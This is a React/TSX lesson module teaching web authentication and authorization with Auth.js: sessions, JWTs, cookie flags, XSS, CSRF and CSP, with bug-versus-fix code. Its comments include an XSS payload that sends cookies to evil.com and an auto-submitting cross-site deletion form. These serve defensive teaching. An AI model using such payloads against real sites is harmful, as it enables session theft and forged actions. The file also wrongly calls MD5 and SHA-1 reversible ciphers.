"use client";

import { Card, CardContent } from "@/components/ui/card";
import { StepByStepExplanation } from "@/components/StepByStepExplanation";
import { Challenge } from "@/components/Challenge";
import { GotchaList } from "@/components/GotchaList";
import { KeyTakeaways } from "@/components/KeyTakeaways";
import { RoadmapLink } from "@/components/RoadmapLink";
import { SequenceDiagram } from "@/components/SequenceDiagram";
import { LayeredFlow } from "@/components/LayeredFlow";
import { CodeComparison } from "@/components/CodeComparison";

export function Module_5_3_Content() {
  // Data blocks hoisted out of JSX for readability — listed in render order.

  const authSteps = [
    {
      title: "The vocabulary: authentication vs. authorization",
      description: (
        <p>
          Two words that sound similar and mean entirely different things.{" "}
          <em>Authentication</em> answers &quot;who are you?&quot; — it is the act of verifying
          an identity claim. When you type your email and password and click Sign In, the server
          checks whether those credentials match a known account. If they do, you are
          authenticated: the server knows who you are. <em>Authorization</em> answers &quot;what
          are you allowed to do?&quot; — it is the act of checking whether an authenticated
          identity has permission to perform a specific action. The blog&apos;s bug from the Hook
          was an <em>authorization</em> failure, not an authentication one. The user was perfectly
          authenticated — the server knew who they were. But the server never asked the second
          question: is this user allowed to delete this specific post? Both checks are required.
          Both are different. Authentication without authorization means any logged-in user can do
          anything. Authorization without authentication means the server cannot tell who is asking.
        </p>
      ),
      code: `// Authentication: who are you?
// The server verifies credentials and establishes identity.
const session = await auth();        // "this request comes from user id=42"

// Authorization: what can you do?
// The server checks whether that identity has permission.
const post = await prisma.post.findUnique({ where: { id: postId } });

if (session.user.id !== post.authorId) {
  // Authenticated (we know who they are) but NOT authorized
  // (they don't own this post). Reject.
  return { error: "forbidden" };
}

// Both checks passed. Safe to proceed.
await prisma.post.delete({ where: { id: postId } });`,
      language: "ts",
    },
    {
      title: "Sessions vs. tokens: two ways to remember a logged-in user",
      description: (
        <p>
          HTTP is stateless — each request arrives with no memory of previous ones. To remember
          that a user is logged in, the server must attach some proof of identity to every
          subsequent request. There are two dominant strategies. A <em>session</em> approach:
          the server generates an opaque random ID (e.g. <code>sess_a1b2c3</code>), stores a
          mapping of that ID to user data in a database or in-memory cache, and sends the ID to
          the browser in a <em>session</em> cookie. Every request includes the cookie; the server
          looks up the ID to find the user. Revocation is easy: delete the server-side record.
          The cost: every request hits the session store. A <em>token</em> approach (JWT): the
          server generates a signed JSON payload containing the user&apos;s data, signs it with a
          secret key, and sends the signed blob to the browser. The browser sends the token on
          every request; the server verifies the signature mathematically — no database lookup
          needed. The cost: revocation is hard — a stolen token is valid until it expires, because
          there is no server-side record to delete. The reference app uses Auth.js with the JWT
          strategy, which is the default for the Credentials provider. The session object the
          server action reads is reconstructed from the JWT on every request.
        </p>
      ),
      code: `// Session strategy: server stores the data; client holds an opaque ID
// Browser sends cookie: sess_abc
// Server looks up sess_abc → finds { userId: "42" }
// No payload in the cookie — just a lookup key.

// Token (JWT) strategy: server signs the data; client holds the token
// Browser sends cookie: eyJhbGciOiJIUzI1NiJ9.eyJ1c2VySWQiOiI0MiJ9.SflK...
// Server verifies the signature (no DB hit) and decodes: { id: 42 }

// A JWT has three dot-separated parts:
// eyJhbGciOiJIUzI1NiJ9          ← header (algorithm)
// .eyJ1c2VySWQiOiI0MiJ9         ← payload (NOT encrypted — anyone can read it)
// .SflKxwRJSMeKKF2QT4fwpMeJf36  ← signature (tamper-proof if the secret is safe)

// Auth.js with the "jwt" session strategy:
// Every call to auth() decodes the cookie — no DB hit for the session lookup.
// The DB is only hit when you explicitly query it (e.g. to load the user's role).
export const { handlers, auth, signIn, signOut } = NextAuth({
  session: { strategy: "jwt" },  // token-based, not DB sessions
  // ...
});`,
      language: "ts",
    },
    {
      title: "NextAuth (Auth.js v5): the canonical Next.js answer",
      description: (
        <p>
          Auth.js — the library previously known as NextAuth — is the most widely used
          authentication library in the Next.js ecosystem. It handles the protocol complexity
          (OAuth flows, CSRF tokens, session rotation, secure cookie flags) so you can focus on
          the application. The configuration lives in two files. <code>auth.config.ts</code> holds
          the route-level rules (which paths require sign-in) and the provider list for the Edge
          runtime. <code>auth.ts</code> extends that config with the Prisma adapter (which stores
          user accounts in your database) and the Credentials provider (email + password). The
          Credentials provider&apos;s <code>authorize</code> function is where the actual
          credential check happens: parse the input, look up the user, compare the bcrypt hash.
          OAuth providers — GitHub, Google — are a one-line addition to the <code>providers</code>{" "}
          array; the library handles the redirect dance automatically. The reference app uses
          email-and-password as the concrete example because it exposes all the moving parts;
          OAuth layers on top without changing the session or authorization model.
        </p>
      ),
      code: `// auth.config.ts — Edge-compatible config (route protection)
import type { NextAuthConfig } from "next-auth";

export const authConfig = {
  pages: { signIn: "/login" },
  callbacks: {
    authorized({ auth, request: { nextUrl } }) {
      // Any path under /admin requires a signed-in user.
      const isOnAdmin = nextUrl.pathname.startsWith("/admin");
      if (isOnAdmin) return !!auth?.user;
      return true;  // all other paths are public
    },
  },
  providers: [],  // providers that need DB go in auth.ts
} satisfies NextAuthConfig;

// ──────────────────────────────────────────────────────────
// auth.ts — full config (Prisma adapter + Credentials provider)
import NextAuth from "next-auth";
import { PrismaAdapter } from "@auth/prisma-adapter";
import Credentials from "next-auth/providers/credentials";
import bcrypt from "bcryptjs";
import { z } from "zod";
import { prisma } from "@/lib/db";
import { authConfig } from "./auth.config";

const credentialsSchema = z.object({
  email: z.string().email(),
  password: z.string().min(6),
});

export const { handlers, auth, signIn, signOut } = NextAuth({
  ...authConfig,
  adapter: PrismaAdapter(prisma),
  session: { strategy: "jwt" },
  providers: [
    Credentials({
      async authorize(credentials) {
        const parsed = credentialsSchema.safeParse(credentials);
        if (!parsed.success) return null;
        const user = await prisma.user.findUnique({
          where: { email: parsed.data.email },
        });
        if (!user || !user.passwordHash) return null;
        // bcrypt.compare: timing-safe comparison of the supplied password
        // against the stored hash. Never compare passwords as plain strings.
        const ok = await bcrypt.compare(parsed.data.password, user.passwordHash);
        if (!ok) return null;
        return { id: user.id, name: user.name, email: user.email };
      },
    }),
    // One-line OAuth addition — the library handles the redirect flow:
    // GitHub({ clientId: process.env.GITHUB_ID, clientSecret: process.env.GITHUB_SECRET }),
  ],
});`,
      language: "ts",
    },
    {
      title: "Server-side authorization: the actual fix for the Hook bug",
      description: (
        <p>
          Hiding the Delete button in the UI is a courtesy to the user, not a security control.
          The server must check authorization independently, before touching the database, on every
          request — even if the UI makes a given action unreachable. The fix for the Hook bug is
          a delete server action that first calls <code>auth()</code> to confirm who is asking,
          then fetches the post to confirm who owns it, then rejects the request if the two do not
          match. Only after both checks pass does it call <code>prisma.post.delete</code>. This
          pattern — authenticate, then authorize, then mutate — is the required order for every
          state-changing operation. The UI hiding the button is still valuable as a UX choice;
          it just cannot be the only line of defense.
        </p>
      ),
      code: `// lib/actions/delete-post.ts — the authorization-first server action
"use server";

import { revalidatePath } from "next/cache";
import { auth } from "@/auth";
import { prisma } from "@/lib/db";

export async function deletePost(postId: string) {
  // Step 1: Authentication — who is making this request?
  const session = await auth();
  if (!session?.user?.email) {
    return { ok: false as const, error: "Not signed in" };
  }

  // Step 2: Load the post to check ownership.
  const author = await prisma.user.findUnique({
    where: { email: session.user.email },
  });
  const post = await prisma.post.findUnique({ where: { id: postId } });

  // Step 3: Authorization — is this user allowed to delete this post?
  if (!post || !author || post.authorId !== author.id) {
    // Authenticated, but NOT authorized.
    // Return an error — do NOT delete.
    return { ok: false as const, error: "forbidden" };
  }

  // All checks passed. Safe to mutate.
  await prisma.post.delete({ where: { id: postId } });
  revalidatePath("/admin");
  revalidatePath("/");

  return { ok: true as const };
}

// The UI still hides the button for non-authors — that is a good UX choice.
// But an attacker who finds the button via DevTools and removes "hidden"
// will get "forbidden" from the server. The frontend is not the security boundary.`,
      language: "ts",
    },
    {
      title: "Cookie flags: HttpOnly, Secure, SameSite",
      description: (
        <p>
          The session lives in a browser cookie. The value of that cookie is the only thing
          standing between a logged-in session and an attacker. Three attributes on the{" "}
          <code>Set-Cookie</code> header provide three independent layers of defense.{" "}
          <code>HttpOnly</code> tells the browser to never expose the cookie to JavaScript.{" "}
          <code>document.cookie</code> cannot read it; <code>fetch</code> cannot read it. This
          means even if an <em>XSS</em> attack injects a script into your page, the script cannot
          steal the session token. <code>Secure</code> tells the browser to only send the cookie
          over HTTPS — never over plain HTTP — preventing a network-level attacker from seeing it
          in transit. <code>SameSite=Lax</code> tells the browser to send the cookie on
          same-site requests and on top-level navigations from other sites (like clicking a link
          in an email), but not on sub-resource requests (like a form submit triggered by a
          script on another domain). This breaks most <em>CSRF</em> attacks. Auth.js sets all
          three automatically on its session cookie. They work in concert: losing any one of them
          opens a class of attack that the other two cannot close.
        </p>
      ),
      code: `// The Set-Cookie header Auth.js sends for its session cookie:
// Set-Cookie: authjs.session-token=eyJ...; HttpOnly; Secure; SameSite=Lax; Path=/

// What each flag does:
//
// HttpOnly — JavaScript cannot read this cookie.
//   document.cookie            → "" (the session token is invisible)
//   fetch("/api/steal-cookie") → cannot send the session token
//   Mitigates: XSS session hijacking
//
// Secure — only sent over HTTPS connections.
//   HTTP requests              → browser omits the cookie entirely
//   Mitigates: network sniffing on coffee-shop wifi
//
// SameSite=Lax — sent on same-site requests and top-level navigations,
//   but NOT on cross-site sub-resource requests.
//   <a href="https://taproot.app"> from evil.com  → cookie IS sent (top-level navigation)
//   <form action="https://taproot.app/delete">    → cookie is NOT sent (cross-site POST)
//   fetch("https://taproot.app/delete")           → cookie is NOT sent
//   Mitigates: most CSRF attacks
//
// SameSite=Strict is more aggressive:
//   <a href="https://taproot.app"> from evil.com  → cookie is NOT sent
//   This breaks links from emails and external sites — the user arrives
//   logged-out even though they have a valid session. Use Lax, not Strict.`,
      language: "ts",
    },
    {
      title: "XSS: the attacker injects script into your page",
      description: (
        <p>
          <em>XSS</em> — cross-site scripting — is the attack where an attacker&apos;s code runs
          inside your page, in your origin, with access to everything your JavaScript can access.
          The typical vector: a blog comment. A reader submits a comment body containing a script
          tag. If your server stores this string and your frontend renders it as raw HTML, every
          visitor who loads that post page runs the attacker&apos;s code in their browser. React&apos;s
          JSX is safe by default: when you write <code>{"{"}commentBody{"}"}</code>, React
          HTML-encodes the string before inserting it into the DOM. The angle brackets become
          inert entities — text, not a live element. The loaded gun in React is the{" "}
          <code>dangerouslySetInnerHTML</code> prop: it bypasses React&apos;s encoding entirely
          and inserts raw HTML into the DOM. The name is a warning. If you must render
          user-supplied HTML (for a rich-text editor), sanitize it first with a library like
          DOMPurify. <em>CSP</em> — Content Security Policy — is the browser-level
          defense-in-depth: a response header that tells the browser which origins are allowed
          to run scripts. Even if an attacker injects a script tag, the browser refuses to
          execute it if the source is not in the allow-list.
        </p>
      ),
      code: `// ❌ Raw DOM insertion — attacker-supplied HTML executes as code:
commentDiv.innerHTML = commentBody;
// commentBody = '<img src=x onerror="fetch(evil.com+document.cookie)">'
// The browser parses it as HTML. The onerror handler runs. Session stolen.

// ❌ React's explicit raw-HTML opt-in:
// <div dangerouslySetInnerHTML={{ __html: commentBody }} />
// Same problem — React inserts the raw string directly into the DOM.
// The name 'dangerouslySetInnerHTML' exists because this pattern is dangerous.
// Only use it with sanitized, trusted content.

// ✅ React's default — auto-escapes user input:
// <p>{commentBody}</p>
// commentBody = '<script>alert(1)</script>'
// What the browser sees: &lt;script&gt;alert(1)&lt;/script&gt;
// Displayed as text. Never executed. Safe.

// ✅ If raw HTML rendering is unavoidable — sanitize first:
// import DOMPurify from "dompurify";
// <div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(commentBody) }} />
// DOMPurify strips all executable content before React inserts the HTML.

// ✅ CSP header — defense-in-depth even if an injection sneaks through:
// Content-Security-Policy: default-src 'self'; script-src 'self'
// The browser refuses to run any script that did not come from your own origin.
// Even an injected <script src="https://evil.com/payload.js"></script> is blocked.
// Add to next.config.ts:
const headers = [
  { key: "Content-Security-Policy", value: "default-src 'self'; script-src 'self'" },
];`,
      language: "tsx",
    },
    {
      title: "CSRF — and the full picture: auth.ts + authorization together",
      description: (
        <p>
          <em>CSRF</em> — cross-site request forgery — is the attack where the attacker&apos;s
          site causes the victim&apos;s browser to make a request to your site using the
          victim&apos;s credentials. Session cookies are sent automatically by the browser on
          every request to your domain — including requests triggered by code on other domains.
          A malicious page could contain a form that auto-submits to your delete endpoint. If
          the victim is logged in and their session cookie is not protected, the server sees a
          valid session and deletes the post. The defenses layer: <code>SameSite=Lax</code>{" "}
          cookies (step 5) block most cross-site POST requests. CSRF tokens — a secret value
          embedded in the form and verified server-side — catch the rest. Checking the{" "}
          <code>Origin</code> or <code>Referer</code> header on POST requests is a lightweight
          alternative. Next.js server actions handle CSRF tokens automatically — but only when
          you use them as intended (called from a React component via the form&apos;s action or
          via a <code>startTransition</code>). A raw <code>fetch</code> POST to the server action
          URL bypasses the automatic CSRF protection and needs its own check.
        </p>
      ),
      code: `// CSRF scenario without defenses:
// evil.com hosts this HTML — when the victim visits, the form auto-submits:
// <form id="f" action="https://taproot.app/posts/X/delete" method="POST">
// <script>document.getElementById('f').submit();</script>
// The victim's browser attaches their taproot.app session cookie automatically.
// The server sees a valid session and deletes the post.

// ── Defense 1: SameSite=Lax cookie (covered in step 5) ──────────────
// The browser will not send the cookie on cross-site POST form submits.
// Most CSRF is stopped here.

// ── Defense 2: Auth.js server actions include CSRF protection ────────
// When you use server actions wired through Next.js, the framework
// embeds and verifies a CSRF token on each call automatically.

// ── Defense 3: check the Origin header in custom API routes ──────────
import { NextRequest, NextResponse } from "next/server";
import { auth } from "@/auth";

export async function POST(req: NextRequest) {
  // Reject requests that did not originate from our own site.
  const origin = req.headers.get("origin");
  if (origin !== process.env.NEXTAUTH_URL) {
    return NextResponse.json({ error: "forbidden" }, { status: 403 });
  }

  const session = await auth();
  if (!session?.user?.email) {
    return NextResponse.json({ error: "Not signed in" }, { status: 401 });
  }
  // ... authorization check (session.user.id === post.authorId) + delete ...
}

// Summary: use server actions (CSRF handled automatically),
// SameSite=Lax session cookies, and Origin checks on custom API routes.
// These layers overlap intentionally.`,
      language: "ts",
    },
  ];

  const bugCode = `// Bug: frontend-only authorization check.
// app/(public)/posts/[slug]/page.tsx
import { auth } from "@/auth";
import { prisma } from "@/lib/db";

export default async function PostPage({ params }) {
  const { slug } = await params;
  const post = await prisma.post.findUnique({
    where: { slug },
    include: { author: true },
  });
  const session = await auth();

  // The author check happens here — in the HTML sent to the browser.
  const isAuthor = session?.user?.email === post?.author?.email;

  return (
    <article>
      <h1>{post.title}</h1>

      {/* The button is hidden, but it still exists in the DOM.
          DevTools → Elements → find button → remove "hidden" → click.
          The form submits. The server has no check. Post is gone. */}
      <form action="/api/posts/delete" method="POST">
        <input type="hidden" name="postId" value={post.id} />
        <button type="submit" hidden={!isAuthor}>
          Delete post
        </button>
      </form>
    </article>
  );
}

// The server endpoint — no authorization check:
// app/api/posts/delete/route.ts
export async function POST(req: Request) {
  const { postId } = await req.json();
  // No session check. No ownership check.
  // Any request that reaches here deletes the post.
  await prisma.post.delete({ where: { id: postId } });
  return Response.json({ ok: true });
}`;

  const fixCode = `// Fix: UI hides the button (good UX), server checks authorization (security).
// app/(public)/posts/[slug]/page.tsx
import { auth } from "@/auth";
import { prisma } from "@/lib/db";

export default async function PostPage({ params }) {
  const { slug } = await params;
  const post = await prisma.post.findUnique({
    where: { slug },
    include: { author: true },
  });
  const session = await auth();
  const isAuthor = session?.user?.email === post?.author?.email;

  return (
    <article>
      <h1>{post.title}</h1>

      {/* UI still hides the button for non-authors — that is good UX.
          But this is now a courtesy, not the security gate. */}
      {isAuthor && (
        <form action={deletePostAction}>
          <input type="hidden" name="postId" value={post.id} />
          <button type="submit">Delete post</button>
        </form>
      )}
    </article>
  );
}

// lib/actions/delete-post.ts — server action with real authorization
"use server";
import { auth } from "@/auth";
import { prisma } from "@/lib/db";
import { revalidatePath } from "next/cache";

export async function deletePostAction(formData: FormData) {
  const postId = String(formData.get("postId"));

  // Step 1: Authenticate — who is making this request?
  const session = await auth();
  if (!session?.user?.email) return { error: "Not signed in" };

  // Step 2: Authorize — does this user own this post?
  const author = await prisma.user.findUnique({
    where: { email: session.user.email },
  });
  const post = await prisma.post.findUnique({ where: { id: postId } });

  if (!post || !author || post.authorId !== author.id) {
    // An attacker who unhides the button still hits this check.
    return { error: "forbidden" };
  }

  await prisma.post.delete({ where: { id: postId } });
  revalidatePath("/admin");
  revalidatePath("/");
  return { ok: true };
}`;

  const oauthActors = ["Browser", "Your App", "Auth Provider (GitHub)"];
  const oauthMessages = [
    { from: "Browser", to: "Your App", label: "GET /login", note: "" },
    { from: "Your App", to: "Browser", label: "302 → github.com/oauth/authorize?client_id=...&state=...&code_challenge=...", note: "PKCE: code_challenge prevents code interception" },
    { from: "Browser", to: "Auth Provider (GitHub)", label: "user grants access", note: "user sees GitHub consent screen" },
    { from: "Auth Provider (GitHub)", to: "Browser", label: "302 → /api/auth/callback?code=abc&state=...", note: "authorization code + CSRF state token" },
    { from: "Browser", to: "Your App", label: "GET /api/auth/callback?code=abc&state=...", note: "" },
    { from: "Your App", to: "Auth Provider (GitHub)", label: "POST /access_token (code + code_verifier)", note: "PKCE: verifier proves same-tab origin" },
    { from: "Auth Provider (GitHub)", to: "Your App", label: "access_token=gho_...", note: "server-to-server — token never in browser" },
    { from: "Your App", to: "Auth Provider (GitHub)", label: "GET /user (Authorization: Bearer gho_...)", note: "fetch the user profile" },
    { from: "Auth Provider (GitHub)", to: "Your App", label: "{ id, email, name, ... }", note: "" },
    { from: "Your App", to: "Browser", label: "Set-Cookie: session=...; HttpOnly; Secure; SameSite=Lax", note: "Auth.js sets session; redirects to app" },
  ];

  const securityLayerStages = [
    { label: "Same-origin policy", detail: "Browser blocks cross-origin reads by default", color: "blue" as const },
    { label: "Cookie flags", detail: "HttpOnly, Secure, SameSite=Lax stop token theft and CSRF", color: "violet" as const },
    { label: "Server-side authz", detail: "Auth + ownership check before every mutation", color: "emerald" as const },
    { label: "CSP header", detail: "Browser refuses injected scripts not on the allow-list", color: "amber" as const },
    { label: "Input sanitization", detail: "Encode or strip HTML from user-supplied content", color: "rose" as const },
  ];

  const gotchaItems = [
    {
      title: "Hashing a password with bcrypt is one-way — you compare hashes, never plain passwords",
      body: (
        <>
          <code>bcrypt.hash(password, 12)</code> returns an irreversible string. When a user
          signs in, you call <code>bcrypt.compare(password, storedHash)</code> — a timing-safe
          comparison that returns true or false. You never decrypt the hash; you cannot. If your
          database is leaked, the attacker gets hashes, not passwords. Storing passwords as
          plaintext or with a reversible cipher (MD5, SHA-1) means a database leak gives the
          attacker every user&apos;s actual password — which they reuse everywhere. Bcrypt is the
          minimum. Argon2id is the current recommendation for new systems. SHA-256 without a salt
          is not a password hash; it is a liability.
        </>
      ),
    },
    {
      title: "JWTs are signed, not encrypted — the payload is base64-decoded JSON, readable by anyone",
      body: (
        <>
          A JWT has three parts separated by dots. The header and payload are base64url-encoded
          JSON — not encrypted. Paste any JWT into <code>jwt.io</code> and you will see the full
          contents. The signature proves the token was issued by someone with the secret key; it
          does not hide the payload. Never store a database password, a private key, or any
          sensitive secret in a JWT payload. Store only data you are comfortable showing to the
          token holder: user ID, email, role.
        </>
      ),
    },
    {
      title: "SameSite=Strict breaks inbound links from email and other sites",
      body: (
        <>
          With <code>SameSite=Strict</code>, the browser does not send the session cookie even
          on a top-level navigation from another origin — clicking a link in an email, for
          example. The user arrives at your site logged out despite having a valid session. This
          surprises every developer who reaches for Strict thinking it is &quot;more secure.&quot;{" "}
          <code>SameSite=Lax</code> allows the cookie on top-level navigations and blocks it on
          cross-site sub-resource requests — the right trade-off for most apps. Auth.js defaults
          to Lax. Change it to Strict only if you have audited every entry point into your app
          and confirmed that no user ever arrives via an external link.
        </>
      ),
    },
    {
      title: "CSP without 'unsafe-inline' breaks every inline script and style on your page",
      body: (
        <>
          A strict CSP header like <code>script-src &apos;self&apos;</code> blocks all inline{" "}
          <code>&lt;script&gt;</code> tags and all <code>onclick=&quot;...&quot;</code> attributes.
          This is intentional — inlined code is the most common XSS vector — but it breaks
          analytics snippets, third-party widgets, and any JavaScript written directly in HTML.
          Next.js&apos;s generated <code>__NEXT_DATA__</code> script also requires a nonce or
          hash exemption. Migrating to a strict CSP is a real multi-week project: audit every
          script source, move inline scripts to external files, add nonces. Start the audit
          early; do not add <code>&apos;unsafe-inline&apos;</code> as a permanent fix.
        </>
      ),
    },
  ];

  return (
    <div className="space-y-6">
      <div className="flex items-start justify-between gap-4">
        <h1 className="text-3xl font-bold">Identity and Trust</h1>
        <RoadmapLink url="https://roadmap.sh/frontend" />
      </div>

      {/* 1. Hook */}
      <Card>
        <CardContent className="pt-6">
          <p className="text-slate-700 dark:text-slate-300 mb-4">
            The blog is running. Comments are live in Postgres. A new requirement lands: only
            authors should be able to delete their own posts. You implement it in an afternoon.
            On the post page, you check whether the logged-in user is the author. If they are,
            you render the Delete button. If they are not, you add a <code>hidden</code>{" "}
            attribute. Deployed. Done.
          </p>
          <p className="text-slate-700 dark:text-slate-300 mb-4">
            A curious reader opens DevTools, clicks the Elements tab, and finds the button — it
            is right there in the HTML, just invisible. They right-click the element, select
            &quot;Edit as HTML,&quot; and remove the <code>hidden</code> attribute. The button
            appears. They click it. The form submits. The server receives a delete request, finds
            no authorization check in the route handler, queries the database, and deletes the
            post. The post is gone. The author never touched it.
          </p>
          <div className="bg-slate-900 text-slate-100 rounded p-4 font-mono text-sm leading-relaxed mb-4 overflow-x-auto">
            <p className="text-slate-500 mb-1">{"<!-- What the browser renders (any visitor can inspect this) -->"}</p>
            <p>{"<article>"}</p>
            <p className="pl-4">{"<h1>My Post Title</h1>"}</p>
            <p className="pl-4 text-amber-400">
              {"<button hidden type=\"submit\">Delete post</button>"}
            </p>
            <p>{"</article>"}</p>
            <p className="text-slate-500 mt-2 text-xs">
              Step 1: DevTools → Elements → find the button.
              Step 2: right-click → Edit as HTML → remove <code className="text-amber-300">hidden</code>.
              Step 3: click. The server has no check. The post is gone.
            </p>
          </div>
          <p className="text-slate-700 dark:text-slate-300">
            The frontend hid the button. The server trusted the frontend. The attacker needed ten
            seconds and a browser. Where should the security boundary actually be?
          </p>
        </CardContent>
      </Card>

      {/* 2. Mental model */}
      <Card>
        <CardContent className="pt-6">
          <p className="text-slate-700 dark:text-slate-300 mb-4">
            Every check you make in the browser — hiding a button, disabling a field, showing a
            warning — is a courtesy to the user, not a security control. The browser is a machine
            you do not control: the user can read its source, edit its DOM, intercept its network
            requests, and replay any form submission with any data they choose. A determined
            attacker does not need anything exotic; DevTools is enough.
          </p>
          <p className="text-slate-700 dark:text-slate-300 mb-4">
            The server, by contrast, is a machine you do control. It runs your code in an
            environment the attacker cannot modify. Authentication (who is this user?),
            authorization (is this user allowed to do this?), and data validation (is this input
            safe to store?) all belong on the server. The client-side equivalents are useful for
            fast feedback — they save a round trip — but they are never sufficient alone.
          </p>
          <blockquote className="border-l-4 border-blue-500 pl-4 italic text-slate-600 dark:text-slate-400">
            The frontend is not the security boundary.
          </blockquote>
        </CardContent>
      </Card>

      {/* 3. Step-by-step */}
      <h2 className="text-xl font-semibold mb-3">
        Authentication, authorization, sessions, cookies, XSS, and CSRF
      </h2>
      <StepByStepExplanation
        title="From hiding a button to real security: seven concepts that compose"
        description="Each step adds one layer. By step 7 you have a complete mental model of how modern web authentication and authorization work together."
        steps={authSteps}
      />

      {/* Optional: OAuth Authorization Code + PKCE */}
      <SequenceDiagram
        title="OAuth Authorization Code + PKCE flow (e.g. Sign in with GitHub)"
        description="OAuth is delegation: the user grants your app limited access to their GitHub account. The Authorization Code flow keeps the access token server-side; PKCE prevents a stolen authorization code from being exchanged by an attacker."
        actors={oauthActors}
        messages={oauthMessages}
      />

      {/* Optional: security model layered flow */}
      <LayeredFlow
        title="Defense in depth: five layers that compose"
        description="No single mechanism stops every attack. These five layers overlap intentionally — losing one leaves the others in place."
        stages={securityLayerStages}
        direction="horizontal"
      />

      {/* 4. Playground (no live playground; auth needs a real server) */}
      <CodeComparison
        title="Frontend-only check vs. frontend + server authorization"
        description="Left: the Delete button is hidden in the UI but the server has no check — ten seconds in DevTools undoes the protection. Right: the server action authenticates and verifies ownership before touching the database."
        oldCode={{
          title: "Bug: frontend-only authorization",
          code: bugCode,
          language: "tsx",
          cons: [
            "The button exists in the DOM — removing 'hidden' in DevTools reveals it.",
            "The server route has no session check — any request deletes the post.",
            "Hiding UI elements is UX, not a security gate.",
          ],
        }}
        newCode={{
          title: "Fix: server-side authorization",
          code: fixCode,
          language: "tsx",
          pros: [
            "The server action calls auth() and checks post.authorId before deleting.",
            "An attacker who unhides the button still gets 'forbidden' from the server.",
            "The UI still hides the button — now a courtesy, not the only protection.",
          ],
        }}
      />

      {/* 5. Challenges */}
      <h2 className="text-xl font-semibold mb-3">Challenges</h2>

      <Challenge
        title="Spot the XSS sink"
        question="A developer renders user-submitted comment bodies in a React component. Which of the following implementations is safe against XSS?"
        options={[
          {
            id: "a",
            text: "commentDiv.innerHTML = comment.body — fast and simple, sets the HTML directly.",
          },
          {
            id: "b",
            text: "The dangerouslySetInnerHTML prop with comment.body as the value — uses React's explicit opt-in for raw HTML insertion.",
          },
          {
            id: "c",
            text: "<p>{comment.body}</p> — JSX expression, React auto-escapes the string before inserting it into the DOM.",
          },
          {
            id: "d",
            text: "The dangerouslySetInnerHTML prop with a server-side length check on comment.body before rendering.",
          },
        ]}
        correctAnswerId="c"
        explanation={
          <p>
            Option c is safe. React&apos;s JSX expression <code>{"{"}comment.body{"}"}</code>{" "}
            passes the string through HTML encoding before inserting it. A comment body
            containing a script tag becomes inert escaped text in the DOM — not executable.
            Options a and b both bypass encoding and insert raw HTML — any attacker who can
            control <code>comment.body</code> can execute arbitrary JavaScript. Option d is
            worse than it looks: a length check does not sanitize HTML; a short payload like{" "}
            <code>&lt;img src=x onerror=fetch(...)&gt;</code> is only 36 characters and fully
            weaponizable. If you need to render rich text HTML from user input, use a sanitizer
            library like DOMPurify before any raw HTML insertion.
          </p>
        }
      />

      <Challenge
        title="Authentication vs. authorization: what is still wrong?"
        question={`A developer fixes the delete endpoint so it checks whether the user is signed in before deleting. The new server action:

1. Calls auth() — if no session, returns 'Not signed in'.
2. Calls prisma.post.delete({ where: { id: postId } }).

What is still wrong with this implementation?`}
        options={[
          {
            id: "a",
            text: "Nothing — checking that the user is signed in before deleting is sufficient. Authentication is all that is required.",
          },
          {
            id: "b",
            text: "The action needs to also check that the signed-in user is the author of the post. Authentication (who are you?) is done; authorization (are you allowed?) is missing.",
          },
          {
            id: "c",
            text: "The action should use a session strategy instead of JWT — JWT tokens cannot be revoked if the user logs out.",
          },
          {
            id: "d",
            text: "The action needs a CSRF token check before the auth() call.",
          },
        ]}
        correctAnswerId="b"
        explanation={
          <p>
            Option b identifies the correct gap. The action now knows <em>who</em> is making the
            request — that is authentication. But it has not asked whether this particular user
            is allowed to delete this particular post — that is authorization. Any signed-in
            user (including a reader who never authored anything) could call this action with
            any post ID and delete it. The fix: after <code>auth()</code>, load the post and
            compare <code>post.authorId</code> against the session user&apos;s ID. Only if they
            match should the delete proceed. Option a is wrong — authentication alone is not
            sufficient. Options c and d address real concerns but neither is the most immediate
            bug in the code as written; a signed-in reader deleting anyone&apos;s post is the
            primary failure.
          </p>
        }
      />

      {/* 6. GotchaList */}
      <h2 className="text-xl font-semibold mb-3">Things that surprise people</h2>
      <GotchaList items={gotchaItems} />

      {/* 7. KeyTakeaways */}
      <KeyTakeaways
        mentalModel="The frontend is not the security boundary."
        points={[
          <>
            <em>Authentication</em> establishes identity (&quot;who are you?&quot;);{" "}
            <em>authorization</em> checks permission (&quot;what are you allowed to do?&quot;).
            Both are required. Both are different. Every state-changing server action must
            perform both checks, in that order, before touching the database.
          </>,
          <>
            <em>Sessions</em> store user data on the server and give the browser an opaque ID.{" "}
            <em>Tokens</em> (JWT) encode user data in a signed blob the browser holds — the
            server verifies the signature on each request without a database hit. Auth.js uses
            the JWT strategy by default for the Credentials provider. Sessions revoke instantly;
            tokens scale without a session store.
          </>,
          <>
            Secure cookie flags form the first line of browser-side defense.{" "}
            <code>HttpOnly</code> blocks JavaScript from reading the session token (mitigates
            XSS session hijacking). <code>Secure</code> requires HTTPS.{" "}
            <code>SameSite=Lax</code> prevents the cookie from being sent on cross-site POST
            requests (mitigates most CSRF). Auth.js sets all three automatically.
          </>,
          <>
            <em>XSS</em> — cross-site scripting — injects attacker code into your page. React
            auto-escapes JSX expressions, making <code>{"{"}userContent{"}"}</code> safe by
            default. Raw HTML insertion bypasses that protection; sanitize with DOMPurify before
            any such operation. A <em>CSP</em> header is the browser-level backstop: even injected
            scripts are refused if their origin is not on the allow-list.
          </>,
          <>
            <em>CSRF</em> — cross-site request forgery — tricks the browser into sending a
            credentialed request to your server from an attacker&apos;s page.{" "}
            <code>SameSite=Lax</code> cookies block most vectors. Next.js server actions include
            automatic CSRF protection when used as intended. Custom API routes need an{" "}
            <code>Origin</code> header check or an explicit CSRF token.
          </>,
          <>
            Hash passwords with bcrypt before storing them — one-way, timing-safe, irreversible.
            Never store plaintext passwords or use a general-purpose hash (MD5, SHA-1) for
            password storage. Never put secrets in a JWT payload — the payload is public
            base64-encoded JSON. Store only data you are comfortable showing to the token holder.
          </>,
        ]}
      />
    </div>
  );
}
